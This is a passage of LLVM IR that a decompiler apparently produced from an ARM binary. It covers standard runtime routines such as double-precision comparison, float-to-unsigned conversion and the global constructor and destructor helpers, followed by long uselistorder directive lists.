  %v0_1b068 = load i1, i1* @cpsr_z, align 1
  %v1_1b068 = load i1, i1* @cpsr_c, align 1
  %v2_1b068 = xor i1 %v1_1b068, true
  %v3_1b068 = or i1 %v0_1b068, %v2_1b068
  %.v0_1b064 = select i1 %v3_1b068, i32 1, i32 %v0_1b064
  %v2_1b06c = xor i1 %v0_1b068, true
  %v3_1b06c = and i1 %v1_1b068, %v2_1b06c
  %..v0_1b064 = select i1 %v3_1b06c, i32 0, i32 %.v0_1b064
  %v2_1b070 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1b070)
  ret i32 %..v0_1b064

; uselistorder directives
  uselistorder i1 %v1_1b068, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1b074 = load i32, i32* @lr, align 4
  store i32 %v0_1b074, i32* %stack_var_-8, align 4
  %v0_1b078 = call i32 @__aeabi_cdrcmple()
  %v0_1b07c = load i1, i1* @cpsr_z, align 1
  %v1_1b07c = load i1, i1* @cpsr_c, align 1
  %v2_1b07c = xor i1 %v1_1b07c, true
  %v3_1b07c = or i1 %v0_1b07c, %v2_1b07c
  %.v0_1b078 = select i1 %v3_1b07c, i32 1, i32 %v0_1b078
  %v2_1b080 = xor i1 %v0_1b07c, true
  %v3_1b080 = and i1 %v1_1b07c, %v2_1b080
  %..v0_1b078 = select i1 %v3_1b080, i32 0, i32 %.v0_1b078
  %v2_1b084 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1b084)
  ret i32 %..v0_1b078

; uselistorder directives
  uselistorder i1 %v1_1b07c, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 68, 1, 6, 7, 8, 9, 58, 59, 64, 60, 61, 62, 65, 10, 11, 12, 55, 13, 63, 14, 15, 16, 17, 54, 69, 18, 20, 19, 70, 66, 23, 24, 25, 26, 21, 22, 67, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 39, 40, 43, 44, 45, 56, 46, 47, 48, 49, 57, 50, 51, 52, 53 }
  uselistorder i1* @cpsr_z, { 10, 11, 12, 13, 14, 21, 22, 23, 24, 25, 26, 15, 16, 17, 18, 3, 0, 4, 19, 20, 28, 29, 30, 31, 32, 33, 34, 1, 35, 2, 5, 6, 27, 7, 8, 9, 36 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1b088 = load i32, i32* @lr, align 4
  %v0_1b08c = call i32 @__aeabi_cdrcmple()
  %v0_1b090 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1b090 to i32
  %.v0_1b08c. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1b088)
  ret i32 %.v0_1b08c.

; uselistorder directives
  uselistorder i1 false, { 44, 13, 14, 85, 86, 87, 88, 89, 90, 91, 92, 93, 0, 10, 45, 36, 46, 47, 48, 49, 50, 4, 94, 6, 51, 16, 52, 53, 54, 15, 55, 56, 58, 59, 60, 61, 62, 63, 64, 57, 17, 65, 28, 18, 29, 66, 67, 68, 20, 19, 11, 12, 69, 70, 71, 2, 3, 72, 30, 31, 73, 32, 33, 21, 39, 40, 7, 22, 74, 34, 35, 75, 76, 37, 38, 77, 78, 41, 42, 79, 80, 81, 82, 83, 84, 43, 95, 1, 25, 24, 26, 23, 8, 9, 27, 5, 96, 97, 98, 99 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 11, 12, 13, 14, 15, 8, 22, 23, 24, 25, 26, 61, 62, 63, 64, 65, 66, 67, 68, 69, 3, 71, 72, 73, 74, 75, 18, 19, 20, 77, 78, 79, 27, 80, 28, 29, 30, 81, 82, 83, 84, 85, 86, 87, 88, 93, 32, 31, 0, 33, 34, 1, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 4, 107, 108, 109, 5, 110, 111, 112, 6, 113, 114, 115, 116, 117, 118, 119, 120, 53, 35, 36, 37, 7, 39, 40, 38, 56, 57, 58, 121, 21, 122, 123, 124, 90, 91, 92, 125, 54, 55, 41, 42, 94, 95, 96, 70, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2, 76, 16, 17, 89, 59, 60, 9, 10 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1b09c = icmp slt i32 %arg1, 0
  %v2_1b09c = mul i32 %arg1, 2
  br i1 %v1_1b09c, label %dec_label_pc_1b0d0, label %dec_label_pc_1b0a4

dec_label_pc_1b0a4:                               ; preds = %entry
  %v1_1b0a4 = add i32 %v2_1b09c, 2097152
  %v2_1b0a4 = icmp ugt i32 %v2_1b09c, -2097153
  br i1 %v2_1b0a4, label %dec_label_pc_1b0d8, label %dec_label_pc_1b0ac

dec_label_pc_1b0ac:                               ; preds = %dec_label_pc_1b0a4
  %v6_1b0a4 = icmp slt i32 %v1_1b0a4, 0
  br i1 %v6_1b0a4, label %dec_label_pc_1b0b0, label %dec_label_pc_1b0d0

dec_label_pc_1b0b0:                               ; preds = %dec_label_pc_1b0ac
  %v4_1b0b4 = sdiv i32 %v1_1b0a4, 2097152
  %v5_1b0b4 = sub nsw i32 -993, %v4_1b0b4
  %v11_1b0b4 = icmp slt i32 %v5_1b0b4, 0
  br i1 %v11_1b0b4, label %dec_label_pc_1b0e0, label %dec_label_pc_1b0bc

dec_label_pc_1b0bc:                               ; preds = %dec_label_pc_1b0b0
  %v3_1b0bc = mul i32 %arg1, 2048
  %v4_1b0c4 = udiv i32 %arg2, 2097152
  %v1_1b0c0 = or i32 %v3_1b0bc, %v4_1b0c4
  %v5_1b0c4 = or i32 %v1_1b0c0, -2147483648
  %v6_1b0c8 = lshr i32 %v5_1b0c4, %v5_1b0b4
  ret i32 %v6_1b0c8

dec_label_pc_1b0d0:                               ; preds = %dec_label_pc_1b0ac, %entry
  ret i32 0

dec_label_pc_1b0d8:                               ; preds = %dec_label_pc_1b0a4
  %v4_1b0d8 = mul i32 %arg1, 4096
  %v5_1b0d8 = or i32 %v4_1b0d8, %arg2
  %v7_1b0d8 = icmp eq i32 %v5_1b0d8, 0
  br i1 %v7_1b0d8, label %dec_label_pc_1b0e0, label %dec_label_pc_1b0e8

dec_label_pc_1b0e0:                               ; preds = %dec_label_pc_1b0d8, %dec_label_pc_1b0b0
  ret i32 -1

dec_label_pc_1b0e8:                               ; preds = %dec_label_pc_1b0d8
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 20, 5, 6, 21, 7, 8, 9, 10, 22, 27, 14, 28, 12, 13, 15, 16, 23, 24, 17, 25, 18, 26, 11, 19 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 9, 10, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 185, 36, 37, 38, 158, 39, 40, 41, 42, 43, 82, 44, 45, 203, 46, 204, 105, 106, 206, 149, 150, 205, 107, 207, 208, 209, 210, 211, 81, 121, 165, 47, 167, 166, 212, 213, 214, 48, 83, 84, 85, 86, 87, 88, 215, 216, 217, 186, 187, 151, 152, 153, 49, 154, 89, 223, 224, 111, 225, 226, 92, 227, 91, 228, 90, 188, 80, 189, 190, 50, 51, 191, 198, 122, 123, 172, 124, 173, 125, 174, 52, 93, 53, 155, 126, 175, 127, 176, 128, 177, 129, 178, 130, 179, 108, 168, 79, 54, 229, 109, 218, 55, 131, 219, 220, 56, 132, 221, 222, 118, 159, 0, 57, 133, 94, 96, 95, 97, 98, 99, 100, 113, 101, 114, 102, 103, 192, 193, 119, 58, 59, 60, 156, 61, 120, 194, 115, 112, 62, 195, 196, 197, 63, 157, 1, 64, 65, 66, 67, 68, 69, 70, 71, 72, 160, 73, 74, 75, 76, 77, 134, 110, 135, 169, 116, 170, 171, 136, 139, 161, 138, 162, 163, 137, 164, 148, 140, 180, 141, 181, 182, 183, 184, 142, 202, 143, 144, 145, 201, 117, 199, 78, 200, 104, 146, 147 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b0f4 = load i32, i32* @global_var_29000.1210, align 4
  %v7_1b0f8 = icmp eq i32 %v3_1b0f4, -1
  %v3_1b0fc = load i32, i32* @r4, align 4
  store i32 %v3_1b0fc, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_29000.1210 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1b0f8, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1b0fc, i32* %r4.global-to-local, align 4
  %v9_1b104 = load i32, i32* @r0, align 4
  ret i32 %v9_1b104

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1b10c = phi i32 [ %v3_1b110, %.preheader ], [ %v3_1b0f4, %entry ]
  call void @__pseudo_branch(i32 %v0_1b10c)
  %v0_1b110 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b110 = add i32 %v0_1b110, -4
  %v2_1b110 = inttoptr i32 %v1_1b110 to i32*
  %v3_1b110 = load i32, i32* %v2_1b110, align 4
  store i32 %v1_1b110, i32* %r4.global-to-local, align 4
  %v3_1b114 = icmp eq i32 %v3_1b110, -1
  br i1 %v3_1b114, label %dec_label_pc_1b11c, label %.preheader

dec_label_pc_1b11c:                               ; preds = %.preheader
  %v2_1b11c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1b11c, i32* %r4.global-to-local, align 4
  %v8_1b11c = load i32, i32* @r0, align 4
  ret i32 %v8_1b11c

; uselistorder directives
  uselistorder i32 %v3_1b110, { 1, 0 }
  uselistorder i32 %v3_1b0f4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 57, 14, 15, 16, 49, 17, 25, 58, 59, 60, 9, 26, 27, 28, 61, 62, 63, 10, 29, 30, 31, 64, 65, 66, 11, 32, 33, 67, 24, 23, 68, 69, 70, 22, 21, 20, 19, 34, 35, 36, 37, 38, 6, 39, 7, 40, 8, 71, 18, 41, 53, 0, 46, 47, 48, 54, 56, 55, 42, 13, 12, 50, 51, 52, 43, 44, 1, 45, 3, 4, 5, 2 }
  uselistorder i32 -1, { 200, 0, 1, 47, 305, 201, 50, 51, 48, 49, 202, 52, 53, 54, 55, 56, 2, 203, 204, 205, 206, 3, 207, 208, 4, 5, 209, 6, 7, 71, 72, 8, 342, 210, 343, 344, 211, 306, 95, 345, 173, 9, 346, 96, 10, 11, 97, 283, 12, 13, 14, 103, 101, 98, 284, 154, 155, 102, 100, 99, 177, 285, 347, 212, 213, 91, 57, 214, 15, 78, 84, 85, 348, 215, 16, 58, 104, 307, 216, 217, 308, 309, 350, 105, 351, 106, 352, 107, 218, 79, 108, 18, 19, 179, 73, 74, 178, 353, 81, 80, 75, 76, 219, 157, 158, 220, 221, 17, 357, 310, 222, 92, 59, 223, 311, 20, 60, 224, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 225, 109, 331, 227, 61, 86, 312, 228, 313, 314, 93, 87, 88, 315, 316, 317, 318, 319, 163, 110, 320, 226, 180, 89, 229, 198, 321, 199, 338, 339, 230, 181, 182, 21, 332, 231, 232, 322, 323, 183, 111, 333, 112, 358, 113, 296, 114, 381, 115, 382, 116, 383, 117, 334, 118, 384, 22, 23, 233, 24, 119, 297, 298, 234, 235, 236, 293, 184, 185, 120, 25, 299, 26, 286, 83, 237, 27, 287, 238, 186, 239, 28, 29, 82, 62, 63, 240, 241, 242, 77, 300, 243, 301, 30, 31, 121, 359, 122, 360, 123, 294, 124, 355, 125, 354, 126, 304, 127, 292, 128, 361, 187, 362, 129, 363, 244, 130, 245, 324, 246, 247, 248, 131, 249, 250, 251, 252, 253, 254, 64, 65, 94, 255, 172, 132, 325, 256, 188, 326, 66, 327, 328, 189, 32, 257, 258, 159, 164, 162, 33, 165, 36, 34, 35, 166, 190, 329, 330, 259, 67, 295, 133, 349, 134, 302, 135, 385, 386, 136, 288, 137, 340, 138, 341, 139, 289, 140, 335, 141, 387, 142, 364, 143, 391, 144, 336, 145, 365, 146, 390, 147, 303, 148, 337, 149, 356, 150, 290, 151, 291, 152, 388, 90, 389, 68, 69, 260, 261, 262, 263, 264, 265, 160, 153, 191, 37, 38, 266, 267, 268, 39, 40, 192, 269, 270, 41, 70, 42, 43, 156, 193, 194, 44, 161, 271, 272, 174, 175, 176, 45, 273, 167, 168, 169, 170, 171, 46, 274, 275, 276, 277, 278, 279, 280, 281, 282, 195, 196, 197 }
  uselistorder i32* @global_var_29000.1210, { 1, 0 }
  uselistorder i32 1, { 567, 172, 461, 480, 568, 481, 569, 462, 966, 967, 968, 570, 219, 224, 223, 220, 221, 218, 222, 225, 969, 181, 970, 572, 571, 116, 117, 121, 118, 115, 119, 120, 122, 304, 303, 305, 428, 971, 972, 70, 71, 973, 334, 333, 335, 573, 104, 105, 101, 100, 103, 102, 974, 386, 975, 1107, 1108, 1109, 1110, 1111, 1112, 574, 307, 308, 309, 306, 575, 97, 1113, 1114, 490, 576, 268, 269, 266, 270, 265, 267, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 577, 316, 314, 315, 311, 310, 312, 313, 1122, 491, 1123, 1124, 578, 148, 147, 146, 142, 143, 145, 144, 1125, 1126, 1127, 1128, 492, 1129, 1130, 1131, 1132, 1133, 1134, 579, 551, 24, 23, 25, 1135, 176, 1136, 429, 1137, 1138, 1139, 467, 1140, 1141, 1142, 493, 494, 1143, 1144, 580, 317, 318, 320, 319, 322, 321, 581, 1145, 582, 138, 137, 136, 139, 1146, 583, 140, 141, 1147, 1148, 1149, 1150, 584, 18, 19, 891, 892, 893, 894, 895, 896, 897, 898, 899, 587, 586, 585, 173, 174, 175, 900, 901, 902, 903, 904, 591, 590, 589, 588, 163, 162, 168, 164, 167, 166, 165, 169, 170, 161, 171, 430, 1151, 1152, 431, 1153, 1154, 1155, 1156, 1157, 495, 1158, 1159, 1160, 1161, 1163, 593, 592, 12, 10, 14, 11, 15, 16, 17, 9, 13, 403, 1168, 1164, 1165, 1166, 1167, 453, 594, 79, 80, 78, 1169, 595, 930, 931, 932, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 596, 206, 207, 200, 201, 202, 203, 205, 204, 411, 1188, 1185, 1186, 1187, 391, 412, 27, 30, 26, 28, 29, 1189, 1190, 1191, 1197, 1198, 1199, 597, 31, 32, 34, 33, 36, 35, 432, 1200, 1201, 496, 1202, 599, 598, 108, 109, 110, 601, 600, 107, 106, 22, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 413, 1217, 604, 603, 602, 325, 324, 323, 327, 326, 414, 497, 976, 605, 129, 127, 126, 130, 128, 977, 978, 607, 606, 329, 331, 330, 328, 332, 1218, 1219, 1220, 1221, 1222, 609, 608, 177, 178, 610, 69, 1224, 433, 1223, 415, 392, 1226, 434, 1225, 0, 1229, 1230, 1231, 1232, 613, 612, 611, 98, 99, 198, 1233, 1234, 1235, 1236, 1237, 468, 1238, 1239, 469, 1241, 498, 1242, 463, 464, 472, 1, 470, 471, 1243, 1240, 499, 1246, 457, 620, 619, 552, 618, 617, 553, 616, 615, 614, 404, 456, 1248, 1249, 1250, 1251, 1252, 435, 621, 188, 933, 934, 935, 622, 338, 339, 337, 336, 979, 416, 980, 1275, 417, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 554, 624, 623, 157, 156, 150, 154, 149, 155, 158, 151, 153, 152, 625, 159, 420, 436, 981, 500, 982, 983, 501, 400, 437, 397, 418, 419, 984, 502, 985, 986, 987, 988, 438, 989, 387, 990, 991, 503, 992, 993, 565, 566, 639, 638, 637, 636, 635, 634, 633, 632, 631, 630, 629, 628, 627, 555, 626, 91, 82, 83, 94, 89, 84, 85, 90, 86, 88, 96, 81, 87, 93, 95, 92, 1088, 1089, 556, 640, 63, 61, 66, 68, 64, 65, 62, 67, 994, 1032, 1033, 1034, 398, 1035, 1036, 1037, 641, 273, 274, 271, 275, 272, 995, 996, 642, 208, 1192, 1193, 1194, 1195, 1196, 276, 283, 277, 282, 281, 279, 280, 278, 643, 997, 645, 644, 191, 192, 193, 194, 439, 473, 648, 647, 646, 649, 340, 650, 216, 217, 651, 160, 652, 341, 653, 301, 654, 342, 655, 343, 656, 261, 657, 2, 661, 660, 659, 658, 241, 242, 504, 662, 440, 505, 663, 262, 664, 944, 669, 668, 667, 666, 665, 256, 257, 260, 259, 258, 1068, 1069, 672, 671, 670, 263, 673, 405, 923, 924, 399, 925, 674, 345, 349, 344, 346, 348, 350, 347, 926, 441, 506, 507, 508, 509, 945, 675, 229, 406, 905, 676, 211, 213, 214, 212, 215, 180, 179, 951, 390, 442, 952, 678, 677, 236, 237, 240, 238, 239, 679, 252, 248, 254, 250, 249, 251, 253, 680, 73, 75, 74, 77, 76, 72, 681, 682, 683, 685, 684, 1288, 443, 688, 687, 686, 351, 352, 689, 184, 185, 187, 186, 690, 246, 247, 245, 244, 691, 285, 284, 444, 1247, 692, 182, 183, 510, 511, 401, 696, 695, 694, 693, 292, 291, 421, 697, 353, 698, 135, 699, 298, 700, 209, 701, 20, 702, 354, 703, 21, 704, 55, 512, 1253, 402, 1254, 1255, 513, 1274, 708, 707, 706, 705, 56, 58, 59, 57, 709, 710, 1093, 1094, 355, 712, 711, 357, 358, 356, 1289, 713, 1098, 1099, 1100, 1101, 3, 998, 999, 714, 359, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 422, 1000, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 295, 293, 294, 296, 297, 1054, 393, 197, 196, 195, 423, 1162, 946, 947, 948, 949, 190, 189, 1228, 1227, 864, 865, 866, 867, 868, 869, 870, 1293, 113, 114, 111, 112, 1001, 133, 132, 514, 715, 458, 1002, 516, 1003, 1004, 445, 446, 1005, 1006, 517, 1007, 1009, 1010, 1011, 518, 1013, 447, 1014, 1012, 515, 1015, 519, 1016, 459, 1017, 1018, 1008, 719, 718, 717, 716, 42, 47, 44, 48, 51, 43, 49, 50, 45, 52, 46, 1019, 720, 360, 362, 361, 365, 364, 363, 721, 235, 234, 1020, 1021, 1022, 722, 53, 54, 460, 407, 1024, 408, 1025, 448, 1026, 1027, 1029, 394, 1030, 520, 1031, 409, 1028, 451, 730, 729, 728, 727, 726, 725, 724, 723, 37, 41, 39, 40, 38, 521, 424, 731, 123, 124, 125, 1023, 474, 557, 732, 366, 522, 906, 907, 733, 368, 367, 369, 1290, 475, 1291, 1292, 734, 371, 370, 736, 735, 737, 1057, 738, 60, 739, 8, 740, 289, 290, 741, 372, 742, 300, 743, 299, 744, 373, 745, 199, 210, 746, 381, 243, 747, 228, 748, 374, 749, 375, 750, 751, 376, 752, 377, 753, 255, 754, 378, 755, 379, 380, 230, 476, 1244, 1245, 477, 1090, 1091, 388, 1092, 908, 395, 410, 909, 910, 911, 389, 525, 912, 913, 914, 915, 916, 917, 918, 523, 524, 465, 526, 761, 760, 759, 758, 757, 756, 919, 920, 768, 767, 766, 765, 764, 558, 763, 762, 921, 922, 770, 769, 927, 928, 527, 772, 771, 929, 776, 775, 774, 773, 936, 937, 938, 939, 940, 941, 528, 781, 780, 779, 778, 777, 227, 226, 942, 529, 943, 786, 785, 784, 783, 782, 950, 563, 953, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 530, 887, 888, 889, 890, 863, 954, 795, 794, 793, 792, 791, 790, 789, 788, 787, 288, 287, 286, 482, 955, 796, 232, 233, 798, 797, 4, 531, 956, 454, 957, 800, 799, 478, 958, 532, 533, 960, 959, 534, 803, 802, 801, 483, 961, 962, 535, 536, 537, 1095, 559, 963, 538, 804, 479, 539, 964, 540, 965, 810, 809, 808, 807, 806, 805, 449, 450, 811, 452, 1038, 1039, 1040, 541, 396, 1041, 1042, 1043, 542, 1044, 815, 814, 813, 812, 560, 1045, 816, 302, 1046, 817, 543, 1055, 820, 819, 818, 1056, 561, 131, 485, 1058, 1059, 484, 1060, 1061, 486, 487, 1062, 1063, 821, 1064, 5, 6, 1067, 1065, 1066, 544, 825, 824, 823, 822, 1070, 1071, 827, 826, 831, 830, 829, 828, 834, 833, 832, 836, 835, 1072, 1073, 545, 1083, 1084, 455, 1085, 839, 838, 837, 466, 7, 843, 842, 841, 840, 426, 1074, 1075, 1076, 425, 1077, 1081, 1082, 546, 845, 844, 547, 1078, 1079, 1080, 847, 846, 134, 1086, 1087, 848, 562, 264, 849, 851, 850, 1096, 548, 1097, 854, 853, 852, 488, 855, 489, 1102, 1103, 427, 1104, 1105, 856, 385, 1106, 231, 549, 550, 860, 859, 858, 857, 861, 862, 384, 383, 382, 564 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_1b128 = load i32, i32* @r0, align 4
  ret i32 %v5_1b128

; uselistorder directives
  uselistorder i32* @r0, { 9, 10, 11, 59, 60, 61, 128, 12, 62, 13, 129, 8, 130, 131, 14, 132, 15, 173, 174, 175, 176, 177, 178, 179, 16, 182, 180, 181, 17, 63, 64, 183, 184, 7, 186, 187, 188, 189, 190, 191, 18, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 133, 134, 135, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 231, 104, 105, 106, 107, 20, 22, 158, 159, 136, 137, 23, 138, 139, 140, 24, 237, 238, 49, 167, 239, 240, 55, 56, 57, 58, 31, 32, 33, 34, 113, 114, 52, 241, 242, 78, 115, 37, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 125, 126, 244, 25, 26, 233, 27, 232, 243, 116, 28, 234, 235, 236, 19, 171, 160, 36, 141, 142, 143, 21, 144, 145, 146, 3, 29, 147, 148, 4, 6, 0, 1, 149, 150, 5, 151, 152, 153, 30, 154, 155, 156, 2, 157, 185, 69, 70, 71, 247, 248, 110, 111, 44, 35, 246, 245, 38, 50, 51, 39, 230, 40, 169, 41, 170, 43, 42, 72, 73, 74, 75, 53, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 108, 109, 112, 123, 124, 127, 161, 162, 163, 164, 165, 166, 168, 172, 45, 46, 47, 48, 54 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1b130 = load i32, i32* @r4, align 4
  %v0_1b138 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_1b130)
  ret i32 %v0_1b138

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 5, 20, 7, 8, 9, 10, 11, 12, 17, 18, 13, 0, 14, 25, 26, 22, 23, 24, 1, 2, 3, 27, 4, 19, 15, 16, 6, 21 }
  uselistorder i32 0, { 0, 1458, 1, 1459, 1460, 1228, 349, 350, 1461, 1462, 1463, 1464, 2, 1465, 1466, 1467, 4, 5, 6, 1468, 1469, 3, 1470, 1471, 7, 1472, 1473, 46, 1229, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 105, 104, 182, 183, 184, 1482, 1483, 1484, 1485, 1486, 1487, 47, 1488, 1489, 1490, 48, 49, 176, 1491, 1492, 1493, 1494, 50, 177, 361, 1495, 1496, 1497, 1498, 1499, 1500, 51, 1501, 9, 8, 52, 1230, 1502, 1232, 1231, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 10, 1294, 1295, 1296, 1297, 1298, 1299, 362, 1516, 1233, 11, 1517, 363, 1300, 12, 1301, 1518, 1519, 1234, 13, 1520, 1521, 364, 15, 14, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1235, 1236, 1529, 1238, 1530, 1531, 1239, 1240, 1532, 1533, 1237, 1534, 1241, 1535, 1242, 1536, 1537, 1538, 1539, 53, 16, 1540, 1541, 1542, 1543, 127, 1544, 185, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 186, 1243, 1246, 1244, 1245, 1552, 1553, 1554, 1555, 1556, 1557, 187, 1850, 1851, 1852, 1853, 1854, 1855, 1857, 1858, 17, 1859, 1860, 1861, 69, 109, 1862, 1863, 1864, 1865, 1866, 1867, 1876, 1877, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1875, 1878, 188, 1879, 1880, 1881, 365, 366, 1882, 1883, 1247, 1558, 1559, 1895, 367, 368, 1886, 1887, 189, 1888, 1889, 1891, 1890, 1892, 1893, 298, 1894, 178, 179, 180, 1896, 1884, 1885, 96, 97, 1897, 1899, 1900, 1898, 1901, 1902, 1903, 1904, 119, 1905, 1906, 120, 1907, 121, 1908, 122, 1909, 192, 1302, 190, 1303, 1304, 1305, 191, 1306, 110, 111, 1307, 193, 1308, 369, 54, 370, 1309, 1310, 299, 194, 371, 372, 1311, 195, 1910, 1911, 1912, 1917, 196, 1913, 256, 373, 1918, 374, 70, 71, 72, 73, 141, 142, 197, 198, 1919, 143, 1920, 306, 305, 304, 18, 116, 74, 1382, 1383, 1921, 1922, 1384, 199, 1923, 1248, 1924, 140, 144, 1925, 1926, 1934, 1927, 1932, 1933, 257, 1935, 351, 1937, 1936, 258, 1938, 1939, 1940, 302, 1560, 1941, 1942, 1943, 98, 1944, 1945, 200, 1946, 1947, 1948, 1949, 1950, 1951, 1952, 1953, 1954, 1955, 1956, 1957, 1958, 1561, 1562, 55, 1563, 1564, 145, 1565, 1566, 1567, 201, 1568, 1569, 1570, 1571, 1572, 1573, 1959, 1960, 1961, 1962, 1963, 1964, 1965, 1966, 202, 307, 1967, 1968, 1969, 375, 1970, 1971, 1972, 1973, 1974, 1975, 1976, 1977, 75, 1979, 1978, 112, 1980, 1981, 376, 1999, 1982, 1983, 1984, 20, 19, 311, 296, 297, 303, 1985, 1986, 1988, 1989, 146, 251, 1992, 377, 1994, 1995, 21, 1997, 1998, 2000, 378, 312, 1990, 1987, 2011, 2012, 203, 2013, 2014, 22, 2024, 2025, 2026, 2027, 205, 204, 2028, 206, 1385, 1386, 23, 1249, 1574, 76, 147, 1575, 1576, 259, 24, 1250, 261, 1577, 77, 148, 1578, 1579, 260, 2062, 2063, 2064, 2065, 2068, 2069, 2070, 2071, 2072, 2073, 2074, 2075, 2066, 2067, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 56, 2084, 2085, 2086, 2087, 57, 2088, 2089, 58, 2090, 2091, 59, 2092, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2100, 2101, 2102, 2103, 2104, 2105, 2108, 2109, 2110, 2111, 2112, 2113, 2114, 2115, 2106, 2107, 2116, 2117, 2118, 2119, 2120, 2121, 2122, 2123, 60, 2124, 2125, 2126, 2127, 61, 2128, 2129, 2130, 2131, 62, 2132, 2133, 2134, 2135, 2136, 2137, 2138, 2139, 2140, 2141, 2142, 2143, 1580, 1766, 1776, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 207, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 63, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 149, 118, 1619, 1620, 208, 209, 1621, 1622, 1623, 1624, 210, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 64, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 300, 1643, 78, 211, 1644, 150, 379, 1645, 1646, 1647, 1648, 1649, 1650, 65, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 380, 1658, 1659, 1660, 1661, 212, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 213, 1671, 1223, 1672, 1673, 1674, 1224, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1821, 25, 1822, 1834, 1835, 1251, 1836, 1837, 1838, 1839, 1840, 1841, 1684, 1683, 1685, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1686, 1687, 1688, 1689, 1690, 151, 1928, 1929, 26, 1931, 262, 1691, 263, 1692, 1693, 152, 1694, 1792, 2029, 2030, 2031, 2032, 1413, 2144, 2145, 2146, 1795, 2147, 1796, 2148, 2149, 214, 2150, 125, 2151, 123, 124, 2152, 2153, 2154, 381, 382, 383, 2158, 384, 2170, 2175, 1252, 264, 2176, 385, 2174, 386, 387, 27, 2155, 2156, 215, 1414, 313, 1415, 390, 315, 314, 1416, 1417, 1418, 1419, 389, 1420, 1421, 388, 1422, 1797, 216, 2157, 1341, 1342, 1343, 1344, 1345, 1346, 218, 153, 1347, 1348, 1349, 126, 217, 1350, 219, 1423, 1424, 391, 1429, 392, 